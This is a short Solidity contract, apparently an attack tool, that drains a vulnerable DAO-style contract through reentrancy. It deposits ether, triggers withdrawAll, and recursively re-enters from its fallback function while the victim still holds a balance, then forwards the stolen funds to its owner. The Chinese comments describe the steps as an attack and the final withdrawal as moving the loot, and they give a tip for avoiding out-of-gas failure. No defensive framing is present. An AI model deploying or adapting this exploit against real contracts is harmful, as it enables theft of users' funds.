pragma solidity ^0.4.19;

interface IReentrancyDAO {
    function deposit() public payable;
    function withdrawAll() public;
}

contract AttackerDAO {
    IReentrancyDAO public victim;
    address public owner;
    uint public initialDeposit;

    function AttackerDAO(address _victimAddress) public {
        victim = IReentrancyDAO(_victimAddress);
        owner = msg.sender;
    }

    // 1. 攻击入口
    function attack() public payable {
        require(msg.value >= 1 ether);
        initialDeposit = msg.value;

        // 第一步：存款，获取信用 (credit)
        victim.deposit.value(initialDeposit)();

        // 第二步：提款，触发重入
        victim.withdrawAll();
    }

    // 2. 核心重入逻辑
    function () public payable {
        // 只要受害者还有钱，就继续递归调用 withdrawAll
        // 注意：这里没判断 Gas，实际操作建议加一个计数器防止 Out of Gas
        if (address(victim).balance >= initialDeposit) {
            victim.withdrawAll();
        }
    }

    // 3. 提款销赃
    function collectEther() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }
}